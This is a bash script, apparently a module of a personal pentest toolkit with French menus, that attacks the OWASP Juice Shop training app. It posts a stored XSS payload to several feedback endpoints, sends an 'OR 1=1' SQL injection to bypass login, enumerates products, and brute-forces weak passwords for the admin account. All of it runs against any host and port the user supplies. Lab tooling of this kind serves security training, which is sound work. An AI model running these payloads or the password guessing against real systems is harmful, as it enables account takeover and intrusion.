#!/bin/bash
# exploits.sh - Juice Shop exploits (CORRIG√â - supprime duplications)
# Place in: ~/ghost00ls/modules/labs/juiceshop/exploits.sh

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh  # ‚Üê Lib commune

LOG_DIR="${HOME}/ghost00ls/logs/juice_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# Exploits Juice Shop
# ==========================

exploit_xss_feedback() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - XSS via Feedbacks]${NC}"
    
    local IP PORT BASE PAYLOAD
    IP=$(get_host_ip)
    read -p "üåê Host/IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    BASE="http://$IP:$PORT"
    PAYLOAD="<script>alert('JUICE_XSS')</script>"

    local endpoints=(
        "/rest/Feedbacks"
        "/rest/feedbacks"
        "/api/Feedbacks"
        "/rest/public/feedbacks"
    )

    for ep in "${endpoints[@]}"; do
        local url="${BASE}${ep}"
        echo -e "${YELLOW}‚ñ∂ Testing POST ${url}${NC}"
        
        local tmpf=$(mktemp)
        local http_code
        http_code=$(curl -s -w "%{http_code}" -o "$tmpf" -X POST "$url" \
            -H 'Content-Type: application/json' \
            -d "{\"message\":\"$PAYLOAD\",\"name\":\"poc\",\"email\":\"poc@test.invalid\"}" 2>/dev/null)
        
        echo -e "${CYAN}HTTP code: $http_code${NC}"
        
        # V√©rif si JSON
        if grep -q '^[{\[]' "$tmpf" 2>/dev/null; then
            echo -e "${GREEN}‚Üí JSON response:${NC}"
            cat "$tmpf" | jq '.' 2>/dev/null || cat "$tmpf"
        else
            echo -e "${YELLOW}‚Üí Non-JSON response (HTML/text)${NC}"
            head -n 20 "$tmpf"
        fi
        
        rm -f "$tmpf"
        
        if [[ "$http_code" =~ ^2|^3 ]]; then
            echo -e "${GREEN}‚úÖ Endpoint accessible: $url ($http_code)${NC}"
            log_exploit "$LOG_DIR/xss_feedback.log" "SUCCESS" "XSS payload accepted on $url"
            break
        fi
    done
    
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_sqli_login() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - SQLi login]${NC}"
    
    check_tools curl jq
    
    local IP PORT TARGET
    IP=$(get_host_ip)
    read -p "üåê Host/IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    TARGET="http://$IP:$PORT"

    echo -e "${YELLOW}‚ñ∂ Testing SQLi on /rest/user/login${NC}"
    
    local payload='{"email":"\" OR 1=1 --","password":"x"}'
    local resp
    resp=$(curl -s -X POST "$TARGET/rest/user/login" \
        -H 'Content-Type: application/json' \
        -d "$payload" 2>/dev/null)
    
    echo "$resp" | jq '.' 2>/dev/null || echo "$resp"
    
    if echo "$resp" | grep -qi "token"; then
        echo -e "${GREEN}‚úÖ Possible SQLi success (token found)${NC}"
        log_exploit "$LOG_DIR/sqli_login.log" "SUCCESS" "SQLi bypass detected"
    else
        echo -e "${YELLOW}‚ö†Ô∏è No obvious SQLi success${NC}"
    fi
    
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_enum_products() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - Enum Products]${NC}"
    
    check_tools curl jq
    
    local IP PORT TARGET
    IP=$(get_host_ip)
    read -p "üåê Host/IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    TARGET="http://$IP:$PORT"

    echo -e "${YELLOW}‚ñ∂ GET $TARGET/rest/products?filter=all${NC}"
    
    curl -s "$TARGET/rest/products?filter=all" | \
        jq '. | {count: length, sample: .[0:3]}' 2>/dev/null || \
        echo "JQ parse failed"
    
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_weak_passwords() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - Weak passwords]${NC}"
    
    check_tools curl jq
    
    local IP PORT TARGET USER
    IP=$(get_host_ip)
    read -p "üåê Host/IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    read -p "üë§ Email (admin@juice-sh.op): " USER; USER=${USER:-admin@juice-sh.op}
    TARGET="http://$IP:$PORT"

    local PWLIST=(password 123456 admin qwerty letmein)
    
    for pw in "${PWLIST[@]}"; do
        echo -e "${YELLOW}‚ñ∂ Trying $USER:$pw${NC}"
        
        local resp
        resp=$(curl -s -X POST "$TARGET/rest/user/login" \
            -H 'Content-Type: application/json' \
            -d "{\"email\": \"$USER\", \"password\": \"$pw\"}" 2>/dev/null)
        
        echo "$resp" | jq '.' 2>/dev/null || echo "$resp"
        
        if echo "$resp" | grep -qi "authentication"; then
            echo -e "${GREEN}‚úÖ Valid creds: $USER:$pw${NC}"
            log_exploit "$LOG_DIR/weak_pw.log" "SUCCESS" "Weak password: $USER:$pw"
            break
        fi
        
        sleep 1
    done
    
    read -p "üëâ Entr√©e pour revenir..."
}

create_example_exploit() {
    local example_dir="$LOG_DIR/examples"
    mkdir -p "$example_dir"
    
    cat > "$example_dir/juice_enum.sh" <<'EOF'
#!/bin/bash
# Example: enumerate Juice Shop products
URL=${1:-http://127.0.0.1:3000}
curl -s "$URL/rest/products?filter=all" | jq '.'
EOF
    
    chmod +x "$example_dir/juice_enum.sh"
    echo -e "${GREEN}‚úÖ Example created: $example_dir/juice_enum.sh${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

# ==========================
# Menu principal
# ==========================

menu_exploits() {
    while true; do
        clear; banner
        echo -e "${CYAN}=== üí£ Exemples d'exploitation Juice Shop ===${NC}"
        echo
        echo -e "${GREEN}1) XSS via Feedbacks${NC}"
        echo -e "${GREEN}2) SQL Injection (login)${NC}"
        echo -e "${GREEN}3) Enum products (API)${NC}"
        echo -e "${GREEN}4) Weak passwords${NC}"
        echo -e "${YELLOW}5) Create example exploit${NC}"
        echo -e "${RED}0) Retour${NC}"
        echo
        read -p "üëâ Choix : " choice

        case $choice in
            1) exploit_xss_feedback ;;
            2) exploit_sqli_login ;;
            3) exploit_enum_products ;;
            4) exploit_weak_passwords ;;
            5) create_example_exploit ;;
            0) return ;;
            *) echo -e "${RED}‚ùå Option invalide${NC}"; sleep 1 ;;
        esac
    done
}

# Lancement si ex√©cut√© directement
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
